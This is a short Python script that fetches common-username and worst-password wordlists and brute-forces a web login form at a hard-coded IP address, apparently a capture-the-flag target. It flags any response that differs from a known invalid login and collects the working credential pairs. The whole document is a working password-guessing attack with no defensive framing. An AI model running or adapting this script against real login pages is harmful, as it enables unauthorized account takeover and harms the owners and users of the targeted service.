import requests

# get usernames and passwords
usernames = requests.get("https://raw.githubusercontent.com/danielmiessler/SecLists/master/Usernames/top-usernames-shortlist.txt").text.splitlines()
passwords = requests.get("https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/Common-Credentials/500-worst-passwords.txt").text.splitlines()

un_len = len(usernames)
pw_len = len(passwords)

# get response of invalid login to compare
invalid_login_response = requests.post("http://35.196.135.216/94423d4264/login", data={"username": "invaliduser", "password": "invalidpw"}).text

print("invalid login response:\n{}\n".format(invalid_login_response))

logins = []

for idx_un, username in enumerate(usernames):
    for idx_pw, password in enumerate(passwords):
        try:
            r = requests.post("http://35.196.135.216/94423d4264/login", data={"username": username, "password": password})
            if r.text != invalid_login_response:
                    print("### successful login ###")
                    logins.append([r.url, username, password])
            print("{}/{} usernames <> {}/{} passwords\nusername = {}\npassword = {}\nPOST {}\nstatus_code = {}\n".format(idx_un+1, un_len+1, idx_pw+1, pw_len+1, username, password, r.url, r.status_code))
        except Exception as e:
            print(e)

print("{} successful logins\n{}".format(str(len(logins)), logins))
